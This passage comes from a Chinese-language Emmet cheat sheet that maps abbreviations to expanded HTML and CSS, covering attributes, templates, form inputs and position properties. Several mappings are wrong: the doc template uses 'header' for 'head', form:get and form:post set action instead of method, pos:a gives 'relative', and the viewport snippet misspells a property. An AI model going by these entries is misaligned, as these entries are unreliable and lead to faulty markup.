  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>"</span>item4<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>
  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>"</span>item3<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>
  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>"</span>item2<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>
  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>"</span>item1<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>
<span><span><span>&lt;/</span>ul</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="例子五" tabindex="-1"> 例子五</h3>
<p><code>ul&gt;li.item$@3*5</code></p>
<div><pre><code><span><span><span>&lt;</span>ul</span><span>></span></span>
  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>"</span>item3<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>
  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>"</span>item4<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>
  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>"</span>item5<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>
  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>"</span>item6<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>
  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>"</span>item7<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>
<span><span><span>&lt;/</span>ul</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="id-和-class-属性" tabindex="-1"> ID 和 CLASS 属性</h2>
<h3 id="例子一-3" tabindex="-1"> 例子一</h3>
<div><pre><code><span><span><span>&lt;</span>div</span> <span>id</span><span><span>=</span><span>"</span>header<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="例子二-3" tabindex="-1"> 例子二</h3>
<p><code>.title</code></p>
<div><pre><code><span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>“title”<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="例子三-1" tabindex="-1"> 例子三</h3>
<p><code>footer#search.wide</code></p>
<div><pre><code><span><span><span>&lt;</span>footer</span> <span>id</span><span><span>=</span><span>"</span>search<span>"</span></span> <span>class</span><span><span>=</span><span>"</span>wide<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>footer</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="例子四-1" tabindex="-1"> 例子四</h3>
<p><code>p.class1.class2.class3</code></p>
<div><pre><code><span><span><span>&lt;</span>p</span> <span>class</span><span><span>=</span><span>"</span>class1 class2 class3<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>p</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="自定义属性" tabindex="-1"> 自定义属性</h2>
<h3 id="例子一-4" tabindex="-1"> 例子一</h3>
<p><code>p[title=&quot;Hello world&quot;]</code></p>
<div><pre><code><span><span><span>&lt;</span>p</span> <span>title</span><span><span>=</span><span>"</span>Hello world<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>p</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="例子二-4" tabindex="-1"> 例子二</h3>
<p><code>td[rowspan=2 colspan=3 title]</code></p>
<div><pre><code><span><span><span>&lt;</span>td</span> <span>rowspan</span><span><span>=</span><span>"</span>2<span>"</span></span> <span>colspan</span><span><span>=</span><span>"</span>3<span>"</span></span> <span>title</span><span><span>=</span><span>"</span><span>"</span></span><span>></span></span><span><span><span>&lt;/</span>td</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="例子三-2" tabindex="-1"> 例子三</h3>
<p><code>[a=&quot;value1&quot; b=&quot;value2&quot;]</code></p>
<div><pre><code><span><span><span>&lt;</span>div</span> <span>a</span><span><span>=</span><span>"</span>value1<span>"</span></span> <span>b</span><span><span>=</span><span>"</span>value2<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="文本内容" tabindex="-1"> 文本内容: {}</h2>
<h3 id="例子一-5" tabindex="-1"> 例子一</h3>
<p><code>a{Click me}</code></p>
<div><pre><code><span><span><span>&lt;</span>a</span> <span>href</span><span><span>=</span><span>"</span><span>"</span></span><span>></span></span>Click me<span><span><span>&lt;/</span>a</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="例子二-5" tabindex="-1"> 例子二</h3>
<p><code>p&gt;{Click }+a{here}+{ to continue}</code></p>
<div><pre><code><span><span><span>&lt;</span>p</span><span>></span></span>Click <span><span><span>&lt;</span>a</span> <span>href</span><span><span>=</span><span>"</span><span>"</span></span><span>></span></span>here<span><span><span>&lt;/</span>a</span><span>></span></span> to continue<span><span><span>&lt;/</span>p</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="缺省标签名" tabindex="-1"> 缺省标签名</h2>
<h3 id="例子一-6" tabindex="-1"> 例子一</h3>
<p><code>.class1</code></p>
<div><pre><code><span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>class1<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="例子二-6" tabindex="-1"> 例子二</h3>
<p><code>em&gt;.class1</code></p>
<div><pre><code><span><span><span>&lt;</span>em</span><span>></span></span><span><span><span>&lt;</span>span</span> <span>class</span><span><span>=</span><span>"</span>class1<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>span</span><span>></span></span><span><span><span>&lt;/</span>em</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="例子三-3" tabindex="-1"> 例子三</h3>
<p><code>ul&gt;.class1</code></p>
<div><pre><code><span><span><span>&lt;</span>ul</span><span>></span></span>
  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>"</span>class1<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>
<span><span><span>&lt;/</span>ul</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h3 id="例子四-2" tabindex="-1"> 例子四</h3>
<p><code>table&gt;.row&gt;.col</code></p>
<div><pre><code><span><span><span>&lt;</span>table</span><span>></span></span>
  <span><span><span>&lt;</span>tr</span> <span>class</span><span><span>=</span><span>"</span>row<span>"</span></span><span>></span></span>
    <span><span><span>&lt;</span>td</span> <span>class</span><span><span>=</span><span>"</span>col<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>td</span><span>></span></span>
  <span><span><span>&lt;/</span>tr</span><span>></span></span>
<span><span><span>&lt;/</span>table</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><h1 id="html" tabindex="-1"> HTML</h1>
<h2 id="html-基本模板" tabindex="-1"> HTML 基本模板</h2>
<h3 id="doc" tabindex="-1"> doc</h3>
<p><code>扩展写法</code> <code>html&gt;(header&gt;meta[charset=UTF-8]+title{${1:Document}})+body</code></p>
<div><pre><code><span><span><span>&lt;</span>html</span><span>></span></span>
  <span><span><span>&lt;</span>head</span><span>></span></span>
    <span><span><span>&lt;</span>meta</span> <span>charset</span><span><span>=</span><span>"</span>UTF-8<span>"</span></span> <span>/></span></span>
    <span><span><span>&lt;</span>title</span><span>></span></span>Document<span><span><span>&lt;/</span>title</span><span>></span></span>
  <span><span><span>&lt;/</span>head</span><span>></span></span>

  <span><span><span>&lt;</span>body</span><span>></span></span><span><span><span>&lt;/</span>body</span><span>></span></span>
<span><span><span>&lt;/</span>html</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="或者-html-5" tabindex="-1"> ! 或者 html:5</h3>
<p><code>扩展写法</code> <code>!!!+doc[lang=${lang}]</code></p>
<div><pre><code><span><span>&lt;!</span><span>DOCTYPE</span> <span>html</span><span>></span></span>
<span><span><span>&lt;</span>html</span> <span>lang</span><span><span>=</span><span>"</span>en<span>"</span></span><span>></span></span>
  <span><span><span>&lt;</span>head</span><span>></span></span>
    <span><span><span>&lt;</span>meta</span> <span>charset</span><span><span>=</span><span>"</span>UTF-8<span>"</span></span> <span>/></span></span>
    <span><span><span>&lt;</span>title</span><span>></span></span>Document<span><span><span>&lt;/</span>title</span><span>></span></span>
  <span><span><span>&lt;/</span>head</span><span>></span></span>

  <span><span><span>&lt;</span>body</span><span>></span></span><span><span><span>&lt;/</span>body</span><span>></span></span>
<span><span><span>&lt;/</span>html</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="doc4" tabindex="-1"> doc4</h3>
<p><code>扩展写法</code> <code>html&gt;(head&gt;meta[http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=${charset}&quot;]+title{${1:Document}})+body</code></p>
<div><pre><code><span><span><span>&lt;</span>html</span><span>></span></span>
  <span><span><span>&lt;</span>head</span><span>></span></span>
    <span><span><span>&lt;</span>meta</span> <span>http-equiv</span><span><span>=</span><span>"</span>Content-Type<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>text/html;charset=UTF-8<span>"</span></span> <span>/></span></span>
    <span><span><span>&lt;</span>title</span><span>></span></span>Document<span><span><span>&lt;/</span>title</span><span>></span></span>
  <span><span><span>&lt;/</span>head</span><span>></span></span>

  <span><span><span>&lt;</span>body</span><span>></span></span><span><span><span>&lt;/</span>body</span><span>></span></span>
<span><span><span>&lt;/</span>html</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="html-4t" tabindex="-1"> html:4t</h3>
<p><code>扩展写法</code> <code>!!!4t+doc4[lang=${lang}]</code></p>
<div><pre><code><span><span>&lt;!</span><span>DOCTYPE</span> <span>html</span> <span>PUBLIC</span> <span>"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span>"https://www.w3.org/TR/html4/loose.dtd"</span><span>></span></span>
<span><span><span>&lt;</span>html</span> <span>lang</span><span><span>=</span><span>"</span>en<span>"</span></span><span>></span></span>
  <span><span><span>&lt;</span>head</span><span>></span></span>
    <span><span><span>&lt;</span>meta</span> <span>http-equiv</span><span><span>=</span><span>"</span>Content-Type<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>text/html;charset=UTF-8<span>"</span></span> <span>/></span></span>
    <span><span><span>&lt;</span>title</span><span>></span></span>Document<span><span><span>&lt;/</span>title</span><span>></span></span>
  <span><span><span>&lt;/</span>head</span><span>></span></span>

  <span><span><span>&lt;</span>body</span><span>></span></span><span><span><span>&lt;/</span>body</span><span>></span></span>
<span><span><span>&lt;/</span>html</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="html-4s" tabindex="-1"> html:4s</h3>
<p><code>扩展写法</code> <code>!!!4s+doc4[lang=${lang}]</code></p>
<div><pre><code><span><span>&lt;!</span><span>DOCTYPE</span> <span>html</span> <span>PUBLIC</span> <span>"-//W3C//DTD HTML 4.01//EN"</span> <span>"https://www.w3.org/TR/html4/strict.dtd"</span><span>></span></span>
<span><span><span>&lt;</span>html</span> <span>lang</span><span><span>=</span><span>"</span>en<span>"</span></span><span>></span></span>
  <span><span><span>&lt;</span>head</span><span>></span></span>
    <span><span><span>&lt;</span>meta</span> <span>http-equiv</span><span><span>=</span><span>"</span>Content-Type<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>text/html;charset=UTF-8<span>"</span></span> <span>/></span></span>
    <span><span><span>&lt;</span>title</span><span>></span></span>Document<span><span><span>&lt;/</span>title</span><span>></span></span>
  <span><span><span>&lt;/</span>head</span><span>></span></span>

  <span><span><span>&lt;</span>body</span><span>></span></span><span><span><span>&lt;/</span>body</span><span>></span></span>
<span><span><span>&lt;/</span>html</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="html-基本元素" tabindex="-1"> HTML 基本元素</h2>
<h3 id="a" tabindex="-1"> A</h3>
<h4 id="a-link" tabindex="-1"> a:link</h4>
<div><pre><code><span><span><span>&lt;</span>a</span> <span>href</span><span><span>=</span><span>"</span>//<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>a</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="a-mail" tabindex="-1"> a:mail</h4>
<div><pre><code><span><span><span>&lt;</span>a</span> <span>href</span><span><span>=</span><span>"</span>mailto:<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>a</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="area" tabindex="-1"> area</h4>
<div><pre><code><span><span><span>&lt;</span>area</span> <span>shape</span><span><span>=</span><span>"</span><span>"</span></span> <span>coords</span><span><span>=</span><span>"</span><span>"</span></span> <span>href</span><span><span>=</span><span>"</span><span>"</span></span> <span>alt</span><span><span>=</span><span>"</span><span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="area-d" tabindex="-1"> area:d</h4>
<div><pre><code><span><span><span>&lt;</span>area</span> <span>shape</span><span><span>=</span><span>"</span>default<span>"</span></span> <span>coords</span><span><span>=</span><span>"</span><span>"</span></span> <span>href</span><span><span>=</span><span>"</span><span>"</span></span> <span>alt</span><span><span>=</span><span>"</span><span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="area-c" tabindex="-1"> area:c</h4>
<div><pre><code><span><span><span>&lt;</span>area</span> <span>shape</span><span><span>=</span><span>"</span>circle<span>"</span></span> <span>coords</span><span><span>=</span><span>"</span><span>"</span></span> <span>href</span><span><span>=</span><span>"</span><span>"</span></span> <span>alt</span><span><span>=</span><span>"</span><span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="area-r" tabindex="-1"> area:r</h4>
<div><pre><code><span><span><span>&lt;</span>area</span> <span>shape</span><span><span>=</span><span>"</span>rect<span>"</span></span> <span>coords</span><span><span>=</span><span>"</span><span>"</span></span> <span>href</span><span><span>=</span><span>"</span><span>"</span></span> <span>alt</span><span><span>=</span><span>"</span><span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="area-p" tabindex="-1"> area:p</h4>
<div><pre><code><span><span><span>&lt;</span>area</span> <span>shape</span><span><span>=</span><span>"</span>poly<span>"</span></span> <span>coords</span><span><span>=</span><span>"</span><span>"</span></span> <span>href</span><span><span>=</span><span>"</span><span>"</span></span> <span>alt</span><span><span>=</span><span>"</span><span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="b" tabindex="-1"> B</h3>
<h4 id="btn-r" tabindex="-1"> btn:r</h4>
<div><pre><code><span><span><span>&lt;</span>button</span> <span>type</span><span><span>=</span><span>"</span>reset<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>button</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="btn-s" tabindex="-1"> btn:s</h4>
<div><pre><code><span><span><span>&lt;</span>button</span> <span>type</span><span><span>=</span><span>"</span>submit<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>button</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="f" tabindex="-1"> F</h3>
<h4 id="form-get" tabindex="-1"> form:get</h4>
<div><pre><code><span><span><span>&lt;</span>form</span> <span>action</span><span><span>=</span><span>"</span>get<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>form</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="form-post" tabindex="-1"> form:post</h4>
<div><pre><code><span><span><span>&lt;</span>form</span> <span>action</span><span><span>=</span><span>"</span>post<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>form</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="l" tabindex="-1"> L</h3>
<h4 id="link" tabindex="-1"> link</h4>
<div><pre><code><span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>"</span>stylesheet<span>"</span></span> <span>href</span><span><span>=</span><span>"</span><span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="link-css" tabindex="-1"> link:css</h4>
<div><pre><code><span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>"</span>stylesheet<span>"</span></span> <span>href</span><span><span>=</span><span>"</span>style.css<span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="link-print" tabindex="-1"> link:print</h4>
<div><pre><code><span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>"</span>stylesheet<span>"</span></span> <span>href</span><span><span>=</span><span>"</span>print.css<span>"</span></span> <span>media</span><span><span>=</span><span>"</span>print<span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="link-favicon" tabindex="-1"> link:favicon</h4>
<div><pre><code><span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>"</span>shortcut icon<span>"</span></span> <span>type</span><span><span>=</span><span>"</span>image/x-icon<span>"</span></span> <span>href</span><span><span>=</span><span>"</span>favicon.ico<span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="link-touch" tabindex="-1"> link:touch</h4>
<div><pre><code><span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>"</span>apple-touch-icon<span>"</span></span> <span>href</span><span><span>=</span><span>"</span>favicon.png<span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="i" tabindex="-1"> I</h3>
<h4 id="img" tabindex="-1"> img</h4>
<div><pre><code><span><span><span>&lt;</span>img</span> <span>src</span><span><span>=</span><span>"</span><span>"</span></span> <span>alt</span><span><span>=</span><span>"</span><span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="input" tabindex="-1"> input</h4>
<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>"</span>text<span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="inp" tabindex="-1"> inp</h4>
<p>这种写法也适用: <code>input:text input:t</code></p>
<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>"</span>text<span>"</span></span> <span>name</span><span><span>=</span><span>"</span><span>"</span></span> <span>id</span><span><span>=</span><span>"</span><span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="input-hideen" tabindex="-1"> input:hideen</h4>
<p>这种写法也适用: <code>input:h</code></p>
<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>"</span>hidden<span>"</span></span> <span>name</span><span><span>=</span><span>"</span><span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="input-search" tabindex="-1"> input:search</h4>
<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>"</span>search<span>"</span></span> <span>name</span><span><span>=</span><span>"</span><span>"</span></span> <span>id</span><span><span>=</span><span>"</span><span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="input-email" tabindex="-1"> input:email</h4>
<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>"</span>email<span>"</span></span> <span>name</span><span><span>=</span><span>"</span><span>"</span></span> <span>id</span><span><span>=</span><span>"</span><span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="input-url" tabindex="-1"> input:url</h4>
<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>"</span>url<span>"</span></span> <span>name</span><span><span>=</span><span>"</span><span>"</span></span> <span>id</span><span><span>=</span><span>"</span><span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="input-password" tabindex="-1"> input:password</h4>
<p>这种写法也适用: <code>input:p</code></p>
<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>"</span>password<span>"</span></span> <span>name</span><span><span>=</span><span>"</span><span>"</span></span> <span>id</span><span><span>=</span><span>"</span><span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="input-datetime" tabindex="-1"> input:datetime</h4>
<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>"</span>datetime<span>"</span></span> <span>name</span><span><span>=</span><span>"</span><span>"</span></span> <span>id</span><span><span>=</span><span>"</span><span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="input-date" tabindex="-1"> input:date</h4>
<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>"</span>date<span>"</span></span> <span>name</span><span><span>=</span><span>"</span><span>"</span></span> <span>id</span><span><span>=</span><span>"</span><span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="input-datetime-local" tabindex="-1"> input:datetime-local</h4>
<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>"</span>datetime-local<span>"</span></span> <span>name</span><span><span>=</span><span>"</span><span>"</span></span> <span>id</span><span><span>=</span><span>"</span><span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="input-month" tabindex="-1"> input:month</h4>
<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>"</span>month<span>"</span></span> <span>name</span><span><span>=</span><span>"</span><span>"</span></span> <span>id</span><span><span>=</span><span>"</span><span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="input-week" tabindex="-1"> input:week</h4>
<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>"</span>week<span>"</span></span> <span>name</span><span><span>=</span><span>"</span><span>"</span></span> <span>id</span><span><span>=</span><span>"</span><span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="input-time" tabindex="-1"> input:time</h4>
<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>"</span>time<span>"</span></span> <span>name</span><span><span>=</span><span>"</span><span>"</span></span> <span>id</span><span><span>=</span><span>"</span><span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="input-number" tabindex="-1"> input:number</h4>
<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>"</span>number<span>"</span></span> <span>name</span><span><span>=</span><span>"</span><span>"</span></span> <span>id</span><span><span>=</span><span>"</span><span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="input-color" tabindex="-1"> input:color</h4>
<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>"</span>color<span>"</span></span> <span>name</span><span><span>=</span><span>"</span><span>"</span></span> <span>id</span><span><span>=</span><span>"</span><span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="input-checkbox" tabindex="-1"> input:checkbox</h4>
<p>这种写法也适用: <code>input:c</code></p>
<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>"</span>checkbox<span>"</span></span> <span>name</span><span><span>=</span><span>"</span><span>"</span></span> <span>id</span><span><span>=</span><span>"</span><span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="input-radio" tabindex="-1"> input:radio</h4>
<p>这种写法也适用: <code>input:r</code></p>
<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>"</span>radio<span>"</span></span> <span>name</span><span><span>=</span><span>"</span><span>"</span></span> <span>id</span><span><span>=</span><span>"</span><span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="input-range" tabindex="-1"> input:range</h4>
<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>"</span>range<span>"</span></span> <span>name</span><span><span>=</span><span>"</span><span>"</span></span> <span>id</span><span><span>=</span><span>"</span><span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="input-file" tabindex="-1"> input:file</h4>
<p>这种写法也适用: <code>input:f</code></p>
<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>"</span>file<span>"</span></span> <span>name</span><span><span>=</span><span>"</span><span>"</span></span> <span>id</span><span><span>=</span><span>"</span><span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="input-submit" tabindex="-1"> input:submit</h4>
<p>这种写法也适用: <code>input:s</code></p>
<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>"</span>submit<span>"</span></span> <span>value</span><span><span>=</span><span>"</span><span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="input-image" tabindex="-1"> input:image</h4>
<p>这种写法也适用: <code>input:i</code></p>
<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>"</span>image<span>"</span></span> <span>src</span><span><span>=</span><span>"</span><span>"</span></span> <span>alt</span><span><span>=</span><span>"</span><span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="input-button" tabindex="-1"> input:button</h4>
<p>这种写法也适用: <code>input:b</code></p>
<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>"</span>button<span>"</span></span> <span>value</span><span><span>=</span><span>"</span><span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="input-reset" tabindex="-1"> input:reset</h4>
<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>"</span>reset<span>"</span></span> <span>value</span><span><span>=</span><span>"</span><span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="m" tabindex="-1"> M</h3>
<h4 id="meta-utf" tabindex="-1"> meta:utf</h4>
<div><pre><code><span><span><span>&lt;</span>meta</span> <span>http-equiv</span><span><span>=</span><span>"</span>Content-Type<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>text/html;charset=UTF-8<span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="meta-win" tabindex="-1"> meta:win</h4>
<div><pre><code><span><span><span>&lt;</span>meta</span> <span>http-equiv</span><span><span>=</span><span>"</span>Content-Type<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>text/html;charset=windows-1251<span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="meta-vp" tabindex="-1"> meta:vp</h4>
<div><pre><code><span><span><span>&lt;</span>meta</span>
  <span>name</span><span><span>=</span><span>"</span>viewport<span>"</span></span>
  <span>content</span><span><span>=</span><span>"</span>width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minmum-scale=1.0<span>"</span></span>
<span>/></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><h4 id="meta-compat" tabindex="-1"> meta:compat</h4>
<div><pre><code><span><span><span>&lt;</span>meta</span> <span>http-equiv</span><span><span>=</span><span>"</span>X-UA-Compatible<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>IE=7<span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="menu-context" tabindex="-1"> menu:context</h4>
<p>这种写法也适用: <code>menu:c</code></p>
<div><pre><code><span><span><span>&lt;</span>menu</span> <span>type</span><span><span>=</span><span>"</span>context<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>menu</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="menu-toolbar" tabindex="-1"> menu:toolbar</h4>
<p>这种写法也适用: <code>menu:t</code></p>
<div><pre><code><span><span><span>&lt;</span>menu</span> <span>type</span><span><span>=</span><span>"</span>toolbar<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>menu</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h1 id="css" tabindex="-1"> CSS</h1>
<h2 id="视觉格式" tabindex="-1"> 视觉格式</h2>
<h3 id="position" tabindex="-1"> position</h3>
<ul>
<li><strong>pos</strong> =&gt; <code>position: relative;</code></li>
<li><strong>pos:s</strong> =&gt; <code>position: static;</code></li>
<li><strong>pos:a</strong> =&gt; <code>position: relative;</code></li>
<li><strong>pos:r</strong> =&gt; <code>position: relative;</code></li>
<li><strong>pos:f</strong> =&gt; <code>position: fixed;</code></li>
<li><strong>t</strong> =&gt; <code>top: ;</code></li>
<li><strong>t:a</strong> =&gt; <code>top: auto;</code></li>
<li><strong>l</strong> =&gt; <code>left: ;</code></li>
<li><strong>l:a</strong> =&gt; <code>left: auto;</code></li>
